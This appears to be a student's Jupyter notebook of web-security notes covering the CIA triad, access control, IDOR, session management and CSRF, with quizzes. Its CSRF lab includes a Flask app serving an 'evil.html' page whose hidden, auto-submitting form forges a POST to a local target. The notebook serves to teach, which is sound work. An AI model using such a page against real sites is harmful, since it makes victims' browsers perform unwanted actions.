{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CIA\n",
    "\n",
    "### Confidentiality:\n",
    "Only those authorized can access info.  \n",
    "#### Vulnerabilities\n",
    "Unauthorized access to sensitive info (identity theft, financial fraud, or loss of competitive advantage)\n",
    "\n",
    "---\n",
    "\n",
    "### Integrity:\n",
    "Accuracy and completeness of info.  \n",
    "#### Vulnerabilities\n",
    "An attacker could cause incorrect info to be displayed/processed, leading to incorrect decision-making, fraude, etc.\n",
    "\n",
    "---\n",
    "\n",
    "\n",
    "### Availavility:\n",
    "Authorized users have timely and reliable access to resources.  \n",
    "#### Vulnerabilities\n",
    "Exploits could disrupt services, resulting in loos of prouctivity, revenue, etc.\n",
    "\n",
    "\n",
    "---\n",
    "___"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Broken Access Control\n",
    "Access controls are responsible for determining which users are allowed to access, modify, or delete specific resources within a system. Access control enforces that users cannot act outside of their intended permissions.  \n",
    "\n",
    "#### Common access control vulnerabilities:\n",
    "\n",
    "1. Violation of the principle of least privilege or deny by default.\n",
    "2. Bypassing access control checks by modifying URL params, internal App state, the HTML page or API requests.\n",
    "3. Insecure direct object references: permitting viewing or editing someone else's account.\n",
    "4. Accessing API with missing access controls for POST, PUT and DELETE.\n",
    "5. Elevation of privilege: Acting as a user without being logged, or as an admin without being one.\n",
    "6. Metadata manipulation: JWTs, cookies, hidden fields.\n",
    "7. CORS misconfiguration, allowing unauthorized/untrusted origins.\n",
    "8. Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.\n",
    "\n",
    "---\n",
    "___\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Insecure Direct Object Reference (IDOR)\n",
    "\n",
    "A common sec vulnerability that happens when an app exposes direct acces con internal objects, such as files, db records, etc, without proper access control.  \n",
    "Usually, this occurs when devs implement insufficient access controls on resources that are referenced by URL params, form fields or other user-controlled inputs.\n",
    "\n",
    "---\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Insecure Session Management\n",
    "\n",
    "A session is a temporary interaction between a user and a web application, established to maintain the user’s state and track their activities across multiple requests. These sessions are typically managed through the use of session tokens, which are unique identifiers assigned to each user during their interaction with the application.\n",
    "\n",
    "Insecure Session Management can lead to unauthorized access, session hijacking, etc, compromising the CIA of user data and the app itself.\n",
    "\n",
    "Some causes can be:\n",
    "\n",
    "1. Weak session token generation.\n",
    "2. Improper storage and transmission of session tokens.\n",
    "3. Lack of session timeouts.\n",
    "4. Ineffective session termination.\n",
    "\n",
    "\n",
    "And some practices and guidelines to prevent ISM:\n",
    "\n",
    "1. Use secure algorithms to generate session cookies.\n",
    "2. Ensure the use of HTTPS.\n",
    "3. Implement secure cookie attributes\n",
    "4. Regularly expire session tokens.\n",
    "\n",
    "More info on sessions here: [Session Management Testing](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema)\n",
    "\n",
    "Quiz:\n",
    "\n",
    "- What is a session in the context of web application development?\n",
    "  * A unique identifier used to track user state\n",
    "- Which of the following is the primary purpose of session tokens?\n",
    "  * Managing and tracking user activities across multiple requests\n",
    "- Which security breach can result from Insecure Session Management?\n",
    "  * Unauthorized access\n",
    "- What is the main benefit of implementing secure cookie attributes in session management?\n",
    "  * Protection against session hijacking\n",
    "\n",
    "---\n",
    "---\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Cross-Site Request Forgery (CSRF)\n",
    "Enables an attacker to manipulate and execute unauthorized actions on behalf of an unsuspecting user. The attacker tricks the user into performing actions on a site they are already authenticated on, whithout them knowing/consenting.  \n",
    "\n",
    "![Attack](https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/6fcr2jtrl9za-csrf1.png)\n",
    "\n",
    "The attack is executed by exploiting the web application’s failure to properly validate the source of incoming requests. It typically involves crafting malicious links, embedding them in seemingly innocuous content such as emails or web pages, and then enticing the user to click on those links. When the user interacts with the malicious content, their browser inadvertently sends a request to the targeted web application, which then executes the unintended action.\n",
    "The attack inherits the identity and privileges of the victim to perfom the undesired action. For most sites, browser requests automatically include any credentials associated with the site (session cookies, IP address, etc).\n",
    "\n",
    "CSRF attacks taget functionality taht causes a state change / data mutation, as the attacker doesn't receive the response, the victim does.\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CSRF Lab\n",
    "\n",
    "Run these commands in your terminal:\n",
    "\n",
    "```bash\n",
    "python3 -m venv .venv\n",
    "source .venv/bin/activate\n",
    "pip install flask\n",
    "pip install request\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# app.py\n",
    "\n",
    "from flask import Flask, request, url_for, render_template, redirect, make_response\n",
    "import requests\n",
    "\n",
    "app = Flask(__name__, static_url_path='/static', static_folder='static')\n",
    "\n",
    "app.config['DEBUG'] = True\n",
    "\n",
    "@app.route(\"/\")\n",
    "def start():\n",
    "  return render_template(\"evil.html\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "  app.run(host='0.0.0.0', port=1337)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```html\n",
    "<!-- templates/evil.html -->\n",
    "\n",
    "<iframe style=\"display:none\" name=\"csrf-frame\"></iframe>\n",
    "<form method='POST' action='http://0.0.0.0:5000/update' target=\"csrf-frame\" id=\"csrf-form\">\n",
    "  <input type='hidden' name='color' value='Hackzord!'>\n",
    "  <input type='submit' value='submit'>\n",
    "</form>\n",
    "<script>document.getElementById(\"csrf-form\").submit()</script>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Run the app with:\n",
    "\n",
    "```bash\n",
    "python app.py\n",
    "```\n",
    "\n",
    "Open a new browser tab => `http://localhost:1337/`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CSRF Quiz:\n",
    "\n",
    "* Which of the following actions could be performed by an attacker in a CSRF attack?\n",
    "  - [x] Changing the victim’s account settings\n",
    "  - [ ] Stealing the victim’s session cookie\n",
    "  - [ ] Directly accessing the victim’s account data\n",
    "  - [ ] Intercepting the victim’s network traffic\n",
    "* What is a common method used by attackers to execute a CSRF attack?\n",
    "  - [ ] Injecting malicious scripts into a web page\n",
    "  - [ ] Exploiting server-side vulnerabilities\n",
    "  - [x] Tricking the user into clicking a malicious link\n",
    "  - [ ] Brute-forcing the user’s credentials\n",
    "* Which of the following security measures can help prevent CSRF attacks?\n",
    "  - [ ] Input validation\n",
    "  - [x] Anti-CSRF tokens\n",
    "  - [ ] Content Security Policy\n",
    "  - [ ] Rate limiting\n",
    "* What purpose does the SameSite attribute serve in relation to CSRF protection?\n",
    "  - [x] It prevents cookies from being sent in cross-site requests\n",
    "  - [ ] It encrypts cookies to protect them from theft\n",
    "  - [ ] It sets a time limit for cookie expiration\n",
    "  - [ ] It enforces strict transport security on cookies\n",
    "\n",
    "---\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Cryptographic Failures:\n",
    "\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
